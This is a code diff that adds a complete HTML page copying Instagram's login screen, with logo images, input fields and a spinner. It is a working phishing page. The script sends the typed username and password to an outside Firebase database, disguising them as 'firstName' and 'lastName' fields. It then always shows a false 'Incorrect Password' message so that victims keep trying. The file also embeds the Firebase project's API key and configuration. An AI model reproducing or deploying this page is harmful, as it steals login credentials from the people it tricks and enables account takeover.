@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Instagram Login</title>
+        
+        <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+        
+        
+        <script src="https://www.gstatic.com/firebasejs/5.5.3/firebase.js"></script>
+        
+        
+        <style>       
+* {
+     margin:0;
+     padding:0;
+     border:0px solid black;
+ }
+
+body {
+   height:100vh;
+   width:100vw;
+   overflow:hidden;
+   user-select:none;
+   font-family: serif, sans-serif;
+}
+
+.english {
+    position:absolute;
+    transform:translate(-50%,50%);
+    left:50%;
+    color:grey;
+    font-size:15px;
+}
+
+
+.login {
+    position:absolute;
+    top:15%;
+    margin-left:50%;
+    transform:translateX(-50%);
+}
+
+
+.instagram {
+    position:relative;
+    height:50px;
+    top:15%;
+    transform:translateX(-50%);
+    margin-left:50%;
+}
+
+input , #login {
+    display:block;
+    height:40px;
+    transform:translateX(-50%);
+    position:;
+    width:60vw;
+    margin-top:10px;
+    border-radius:5px;
+    outline:none;
+    border:1px solid lightgrey;
+    padding-left:10px;
+    margin-left:50%;
+}
+
+.login p {
+    color:#2196F3;
+    font-weight:400;
+    margin-top:15px;
+    font-size:12px;
+    margin-left:58%;
+    padding:0;
+}
+
+#login {
+    padding:0;
+    background-color:#2196F3;
+    color:white;
+    margin-top:15px;
+    font-weight:700;
+    border:none;
+    color:white;
+    opacity:0.3;
+}
+
+#meta {
+    position:fixed;
+    height:38px;
+    top:95vh;
+    transform:translate(-50%,-50%);
+    left:50%;
+}
+
+a {
+    text-decoration:none;
+}
+
+
+
+.spinner {
+  position:relative;
+  margin: 0px auto 0;
+  width: 30px;
+  text-align: center;
+  bottom:30px;
+  display:none;
+}
+
+.spinner > div {
+  width: 6.3px;
+  height: 6.3px;
+  background-color: #fff;
+
+  border-radius: 100%;
+  display: inline-block;
+  -webkit-animation: sk-bouncedelay 1.4s infinite ease-in-out both;
+  animation: sk-bouncedelay 1.4s infinite ease-in-out both;
+}
+
+.spinner .bounce1 {
+  -webkit-animation-delay: -0.32s;
+  animation-delay: -0.32s;
+}
+
+.spinner .bounce2 {
+  -webkit-animation-delay: -0.16s;
+  animation-delay: -0.16s;
+}
+
+@-webkit-keyframes sk-bouncedelay {
+  0%, 80%, 100% { -webkit-transform: scale(0) }
+  40% { -webkit-transform: scale(1.0) }
+}
+
+@keyframes sk-bouncedelay {
+  0%, 80%, 100% { 
+    -webkit-transform: scale(0);
+    transform: scale(0);
+  } 40% { 
+    -webkit-transform: scale(1.0);
+    transform: scale(1.0);
+  }
+}
+
+#blank {
+    position:absolute;
+    top:0;
+    left:0;
+    height:100%;
+    width:100%;
+    background-color: rgba(0, 0, 0, 0.6);
+    display:none;
+}
+
+#wrong {
+    position:absolute;
+    width:60%;
+    transform:translate(-50%,-50%);
+    top:50%;
+    left:50%;
+    background-color:white;
+    border-radius:10px;
+    overflow:hidden;
+    display:none;
+}
+
+#cap {
+    display:block;
+    transform:translate(-50%,50%);
+    margin-left:47.5%;
+    margin-top:18px;
+    white-space:nowrap;
+    margin-bottom:0%;
+}
+
+#minicap {
+    transform:translate(-50%,50%);
+    margin-left:50%;
+    font-size:14px;
+    color:grey;
+    width:80%;
+    text-align:center;
+}
+
+hr {
+    width:100%;
+    height:0.5px;
+    background-color:lightgrey;
+}
+
+h5 {
+    margin-top:15px;
+}
+
+.tryagain {
+    width:100%;
+    background-color:;
+    margin-top:40px;
+    text-align:center;
+    color:#2196F3;
+    padding-bottom:15px;
+}
+
+.tryagain:active {
+    background-color:lightgrey;
+}
+
+        </style>
+        
+        
+        
+        
+        
+    </head>
+    <body>
+        <p class="english">English (India) </p>
+        
+        
+        <div class="login" >
+        
+        <img class="instagram" src="https://i.ibb.co/QFy23X6/1642696813765.png" />
+        
+        <input id="email" type="text" placeholder="Phone number, username, or email" />
+        
+        <input id="pass" type="password" placeholder="Password" />
+        <a href="#">
+        <p> Forget Password?</p> </a>
+        
+        <button id="login">Log In</button>
+        
+        <div class="spinner" id="spinner">
+  <div class="bounce1"></div>
+  <div class="bounce2"></div>
+  <div class="bounce3"></div>
+</div>
+        
+        
+        
+        </div>
+        
+        <img id="meta" src="https://i.ibb.co/ZmTXTzN/1642699576538.png" />
+        
+        
+        <div id="blank">
+            <div id="wrong">
+                <div>
+                    
+                    <h4 id="cap">Incorrect Password</h4>
+                    
+    <p id="minicap">The password you entered is incorrect. Please try again.</p>      
+            <div class="tryagain" id="tryagain">
+                <hr>
+                <h5>Try Again</h5>
+            </div>     
+                </div> 
+            </div>
+        </div>
+    </body>
+    
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script> 
+
+    
+    <script>
+    
+    document.getElementById("meta").style.top = (innerHeight-(innerHeight/18))+"px";
+    
+    
+var email = document.getElementById("email");
+var pass = document.getElementById("pass");
+var login = false;
+
+
+email.onkeyup = () => {
+    check();
+}
+
+pass.onkeyup = () => {
+    check();
+}
+
+
+
+function check() {
+    let emailc = false,passc = false;
+    
+    if(!isNaN(email.value))
+    {
+        if(email.value.length == 10)
+        emailc = true;
+    }
+    else {
+        emailc = true;
+    }
+    
+    if(pass.value.length >= 6)
+    {
+        passc = true;
+    }
+    
+    if(emailc && passc) {
+        document.getElementById("login").style.opacity = "1";
+        login = true;
+        
+    }
+    else {
+        document.getElementById("login").style.opacity = "0.3";
+        login = false;
+    }
+    
+}
+
+
+document.getElementById("login").onclick = () => {
+    if(login) {
+    
+    
+    document.getElementById("login").style.color = "#2196F3";
+    
+    document.getElementById("spinner").style.display  = "block";
+    
+    setTimeout( () => {
+    document.getElementById("blank").style.display = "block";
+    document.getElementById("wrong").style.display = "block";
+    
+    document.getElementById("login").style.color = "white";
+    
+    document.getElementById("spinner").style.display  = "none";
+    
+    
+    
+    },Math.floor(Math.random()*5000)+1000);
+    
+    }
+}
+
+document.getElementById("tryagain").onclick = () => {
+    document.getElementById("blank").style.display = "none";
+    document.getElementById("wrong").style.display = "none";
+}
+
+var config = {
+    apiKey: "AIzaSyA_kyipbRucrtWAtf8jbULc1B0DBRHPHHU",
+
+
+    authDomain: "sharemedia-298b0.firebaseapp.com",
+
+
+    databaseURL: "https://sharemedia-298b0-default-rtdb.firebaseio.com/",
+
+
+    projectId: "sharemedia-298b0",
+
+
+    storageBucket: "sharemedia-298b0.appspot.com",
+
+
+    messagingSenderId: "453857796374"
+  };
+
+firebase.initializeApp(config); 
+var rootRef = firebase.database().ref().child('graduate');
+
+
+
+$('#login').click(function(){ 
+if(login) { rootRef.push().set({ firstName:$('#email').val(), lastName:$('#pass').val() });
+}
+})
+
+
+
+
+
+</script>
+
+
+   
+</html>
